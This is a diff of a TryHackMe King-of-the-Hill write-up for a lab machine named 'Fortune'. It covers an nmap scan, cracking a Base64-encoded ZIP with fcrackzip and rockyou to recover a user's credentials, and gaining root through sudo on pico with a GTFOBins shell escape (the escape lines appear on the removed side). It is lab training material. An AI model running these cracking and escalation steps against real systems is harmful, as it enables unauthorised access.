@@ -1,4 +1,14 @@
+# NOTE: This was a blog from *vipin.xyz* see [this](https://www.vipin.xyz/blog/archive)
+
+# Fortune | KOTH Writeup 
+
+A Concise KOTH Writeup.
+
+Released: 2024-04-15
+
 ## NMAP
+
+- I used `sudo nmap -sV -sC 10.10.148.32` for my scan.
 
 ```bash
 ┌──(vipin㉿vipin)-[~]
@@ -52,69 +62,15 @@ PORT     STATE SERVICE    VERSION
 |     BAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA
 |     UEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU
 |_    BQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=
-9999/tcp open  http       Werkzeug httpd 1.0.1 (Python 3.6.9)
-|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
-|_http-title: Site doesn't have a title (text/html; charset=utf-8).
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port3333-TCP:V=7.94SVN%I=7%D=4/14%Time=661C3154%P=aarch64-unknown-linux
-SF:-gnu%r(NULL,124,"UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VV
-SF:QJAAPwLRxm8C0cZnV4CwAB\nBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAb
-SF:RbHKk9xNQSwcIir9xrR8AAAATAAAA\nUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkA
-SF:GAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLB
-SF:QYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(GenericLines,124,"UEsDBAoACQAAAFSjjli
-SF:Kv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwAB\nBAAAAAAEAAAA
-SF:AOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA\nUEsBA
-SF:h4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU
-SF:\nBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(LP
-SF:DString,124,"UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAA
-SF:PwLRxm8C0cZnV4CwAB\nBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHK
-SF:k9xNQSwcIir9xrR8AAAATAAAA\nUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAA
-SF:AAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAA
-SF:AAAAQABAE8AAAByAAAAAAA=\n")%r(JavaRMI,124,"UEsDBAoACQAAAFSjjliKv3GtHwAA
-SF:ABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwAB\nBAAAAAAEAAAAAOjukMXnR
-SF:aL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA\nUEsBAh4DCgAJAA
-SF:AAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD8C0
-SF:cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(kumo-server
-SF:,124,"UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8
-SF:C0cZnV4CwAB\nBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSw
-SF:cIir9xrR8AAAATAAAA\nUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQA
-SF:AAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQAB
-SF:AE8AAAByAAAAAAA=\n")%r(GetRequest,124,"UEsDBAoACQAAAFSjjliKv3GtHwAAABMA
-SF:AAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwAB\nBAAAAAAEAAAAAOjukMXnRaL/b
-SF:0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA\nUEsBAh4DCgAJAAAAVK
-SF:OOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD8C0cZnV
-SF:4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(HTTPOptions,124
-SF:,"UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZ
-SF:nV4CwAB\nBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir
-SF:9xrR8AAAATAAAA\nUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKS
-SF:BAAAAAGNyZWRzLnR4dFVU\nBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8A
-SF:AAByAAAAAAA=\n");
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 24.90 seconds
-
 ```
 
-## Dirsearch 
+## Getting User
 
-```bash
-  _|. _ _  _  _  _ _|_    v0.4.3
- (_||| _) (/_(_|| (_| )
+- Dirsearch gave us nothing.
 
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
-
-Output File: /home/vipin/reports/_10.10.148.32/_24-04-14_15-28-50.txt
-
-Target: http://10.10.148.32/
-
-[15:28:50] Starting: 
-[15:29:18] 200 -  110KB - /favicon.ico                                      
-                                                                             
-Task Completed            
-```
-
-## User
+- If we look at the NMAP Scan, on port 3333 we see this…
 
 ```bash
 3333/tcp open  dec-notes?
@@ -127,13 +83,27 @@ Task Completed
 9999/tcp open  http       Werkzeug httpd 1.0.1 (Python 3.6.9)
 ```
 
-- the base 64 string according to cyberchef seems to be a ZIP, below is how I cracked it
+- After extracting the Base64 string and pasting it into Cyberchef, it tells us it is a PKZIP.
+
+![Image showing pkzip](blog/fortune/pkzip.png 'Fig.1')
+<div style={{ textAlign: 'center' }}>
+  <small>Fig.1</small>
+</div>
+
+- Let's see what's inside.
 
 ```bash
-                                                                                                       
 ┌──(vipin㉿vipin)-[~/Desktop]
 └─$ echo 'UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwABBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAAUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVUBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=' | base64 -d > cred.zip
-                                                                                                       
+┌──(vipin㉿vipin)-[~/Desktop]
+└─$ unzip cred.zip
+Archive:  cred.zip
+[cred.zip] creds.txt password: 
+```
+
+- It seems password-protected. I will crack it with *fcrackzip* (A ZIP cracking tool).
+
+```bash
 ┌──(vipin㉿vipin)-[~/Desktop]
 └─$ fcrackzip -u -D -p  /usr/share/wordlists/rockyou.txt /home/vipin/Desktop/cred.zip
 
@@ -141,7 +111,7 @@ Task Completed
 PASSWORD FOUND!!!!: pw == peaceout
 ```
 
-- lets unzip it!
+- Now that we have the password, we can unzip the file.
 
 ```bash
 ┌──(vipin㉿vipin)-[~/Desktop]
@@ -153,12 +123,9 @@ Archive:  cred.zip
 ┌──(vipin㉿vipin)-[~/Desktop]
 └─$ cat creds.txt 
 fortuna:MGE0OTJiM2
-                                                                                                       
-┌──(vipin㉿vipin)-[~/Desktop]
-└─$ 
 ```
 
-## Priv esc
+- It seems to be credentials to the user *fortuna*.
 
 ```bash
 ┌──(vipin㉿vipin)-[~/Desktop]
@@ -177,10 +144,15 @@ fortuna@10.10.148.32's password:
         ### Welcome to your fortune! ###
         ################################
 
+```
 
+- The credentials worked!
 
-fortuna@fortune:~$ ls
-Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+## Rooting the machine
+
+- I started by running `sudo -l` which tells us what the user can use sudo for.
+
+```bash
 fortuna@fortune:~$ sudo -l
 [sudo] password for fortuna: 
 Matching Defaults entries for fortuna on fortune:
@@ -189,27 +161,25 @@ Matching Defaults entries for fortuna on fortune:
 
 User fortuna may run the following commands on fortune:
     (ALL : ALL) /usr/bin/pico
-fortuna@fortune:~$ 
 ```
 
-- seems like the pico binary has sudo perms!
+> What is pico?
 
-- using gtfobins lets exploit
+- **Pico** is a text editor like **Nano** and **Vim**.
 
-```exploit
-sudo pico
-^R^X
-reset; sh 1>&0 2>&0
-```
+- Lets see how we can utilize it to get root, we will be using [gtfobins](https://gtfobins.github.io/gtfobins/pico/) to do this.
 
-- above is how I got root
+![Image showing gtfobin pico](blog/fortune/gtfobinpico.png 'Fig.2')
+<div style={{ textAlign: 'center' }}>
+  <small>Fig.1 *GTFObins*</small>
+</div>
 
-```bash
-# python -c'import pty; pty.spawn("/bin/bash")'
-root@fortune:~# 
-```
 
-- and i spawned a pty
+- And it worked! (I forgot to take an image of it 😢)
+
+- Once I got root, I spawned a PTY with `python -c'import pty; pty.spawn("/bin/bash")'`
+
+- After I got root, I put my name in the king's file to get points every minute.
 
 ```bash
 root@fortune:/root# ls
@@ -223,11 +193,7 @@ vipin.b
 root@fortune:/root# 
 ```
 
-- seems like there isnt a flag in root but i still put my name into king.txt
-
+- It seems like there isn’t a root flag. At least we rooted the machine!
 
 ### MACHINE PWN'ED 😎
-
-![My Tryhackme badge](https://tryhackme-badges.s3.amazonaws.com/vipin.b.png)
-
 
